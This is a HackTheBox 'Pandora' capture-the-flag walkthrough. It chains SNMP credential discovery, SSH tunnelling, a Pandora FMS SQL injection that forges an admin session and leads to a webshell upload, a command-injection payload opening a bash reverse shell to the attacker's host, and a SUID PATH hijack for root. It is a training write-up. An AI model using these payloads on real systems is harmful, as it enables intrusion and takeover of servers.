# Pandora Walkthrough

Hey guys, today I’ll show you how I rooted Pandora from HackTheBox. This machine was rated easy but it had a nice chain – SNMP to find creds, then pivot to a Pandora FMS application, exploit SQL injection or a command injection to get a shell, and finally a PATH hijack on a SUID binary for root. But there’s a twist: the Apache module used in the box blocks SUID from web shells, so we need SSH to pull off the priv esc. Let’s dive in.

---

## 1. Recon

I started with a full port scan:

```
root@kali:~# nmap -p- --min-rate 10000 10.10.11.142
```

Only two TCP ports came up – 22 (SSH) and 80 (HTTP). Then I did a service scan:

```
root@kali:~# nmap -p 22,80 -sCV 10.10.11.142
```

The versions suggested Ubuntu 20.04. I also did a UDP top 100 scan and found SNMP open on port 161:

```
root@kali:~# sudo nmap -sU --top-ports 100 panda.htb
```

SNMP is often misconfigured, so I enumerated it using `snmpbulkwalk` (much faster than `snmpwalk`). I used the community string `public`:

```
root@kali:~# snmpbulkwalk -Cr1000 -c public -v2c 10.10.11.142 > snmp.txt
```

Inside the output, I looked for running processes. I wrote a quick Python script to extract the process name and arguments. That’s when I spotted something interesting – a process running `host_check` with parameters `-u daniel -p HotelBabylon23`. So I had a username `daniel` and a password.

---

## 2. Initial Shell as Daniel

I tried SSH with those creds:

```
root@kali:~# sshpass -p 'HotelBabylon23' ssh daniel@10.10.11.142
```

I got in! Daniel’s home directory was empty, but I saw another user `matt` with a `user.txt` that I couldn’t read. So I needed to become matt.

While poking around, I checked Apache config files in `/etc/apache2/sites-enabled`. There were two sites: the default one on port 80, and a special one (`pandora.conf`) that only listens on localhost port 80, with `ServerName pandora.panda.htb`. The site runs as user `matt`. So I needed to access that internal virtual host.

I created an SSH tunnel to forward my local port 9001 to the target’s localhost:80:

```
root@kali:~# ssh -L 9001:localhost:80 daniel@10.10.11.142
```

Then I added `pandora.panda.htb` to my `/etc/hosts` pointing to 127.0.0.1. Now I could open `http://pandora.panda.htb:9001/pandora_console/` in my browser. It was a **Pandora FMS** login page (version 7.0NG.742).

---

## 3. Hacking Pandora FMS (Two Ways)

### Method 1: SQL Injection → Admin Session → Webshell

A quick Google showed that this version had a SQL injection in `/pandora_console/include/chart_generator.php`, parameter `session_id` (CVE-2021-32099). I tested it:

```
http://pandora.panda.htb:9001/pandora_console/include/chart_generator.php?session_id=1' UNION SELECT 1,2,3;-- -
```

It worked! So I fired up `sqlmap` to dump the database:

```
root@kali:~# sqlmap -u "http://pandora.panda.htb:9001/pandora_console/include/chart_generator.php?session_id=1" --dbs
```

I found a `pandora` database with a table `tsessions_php`. That table stores PHP session data. I dumped all non-empty sessions:

```
root@kali:~# sqlmap ... -D pandora -T tsessions_php --dump --where "data<>''"
```

Most sessions belonged to `daniel`, but one had `id_usuario|s:4:"matt"`. I copied that session ID (`g4e01qdgk36mfdh90hvcc54umq`) and set my `PHPSESSID` cookie in Firefox to that value. Refreshed the page – boom, I was logged in as **matt**.

But I still wasn’t admin. To become admin, I used the same SQL injection to inject an admin session. Visiting:

```
http://pandora.panda.htb:9001/pandora_console/include/chart_generator.php?session_id=1' UNION SELECT '1','2','id_usuario|s:5:"admin";'-- -
```

Then reloaded the main page, and now I was logged in as **admin**. The admin panel had a File Manager under “Admin tools”. I uploaded a PHP webshell (`cmd.php`) through it. The file landed at `/pandora_console/images/cmd.php`. I accessed it via browser:

```
http://pandora.panda.htb:9001/pandora_console/images/cmd.php?cmd=id
```

And I got command execution as `matt`.

### Method 2: Command Injection via ajax.php (CVE-2020-13851)

Even without becoming admin, as the `matt` user I could exploit a command injection in `ajax.php`. I intercepted a request when visiting “Events” and modified it to:

```
POST /pandora_console/ajax.php HTTP/1.1
...
Cookie: PHPSESSID=g4e01qdgk36mfdh90hvcc54umq

page=include/ajax/events&perform_event_response=10000000&target=bash -c "bash -i >%26 /dev/tcp/10.10.14.6/443 0>%261"&response_id=1
```

On sending, my netcat listener got a shell as `matt`. Either way, I could read `user.txt`:

```
matt@pandora:~$ cat /home/matt/user.txt
```

---

## 4. Privilege Escalation to Root

After getting a shell, I checked for SUID binaries:

```
matt@pandora:/$ find / -perm -4000 -ls 2>/dev/null
```

One stood out: `/usr/bin/pandora_backup`. It was owned by root but executable by group `matt`. However, when I tried to run it from the web shell, it failed saying permission denied. Other SUID programs like `sudo` also didn’t work. I suspected Apache’s `mpm-itk` module was sandboxing us, blocking SUID bits.

So I decided to get a proper SSH session as `matt`. I added my SSH public key to `/home/matt/.ssh/authorized_keys` and connected directly:

```
root@kali:~# ssh -i mykey matt@10.10.11.142
```

Now SUID worked perfectly! I ran `pandora_backup` and saw it called `tar` without an absolute path (using `ltrace` to check). That meant I could hijack the PATH.

I created a fake `tar` script in `/dev/shm`:

```
matt@pandora:/dev/shm$ echo -e '#!/bin/bash\nbash' > tar
matt@pandora:/dev/shm$ chmod +x tar
```

Then I modified my PATH so that `/dev/shm` comes first:

```
matt@pandora:/dev/shm$ export PATH=/dev/shm:$PATH
```

Now when I ran `pandora_backup`, it executed my fake `tar` as root, giving me a root shell:

```
matt@pandora:/dev/shm$ pandora_backup
root@pandora:/dev/shm# id
uid=0(root) gid=0(root)
```

Grabbed the root flag from `/root/root.txt`. 

---

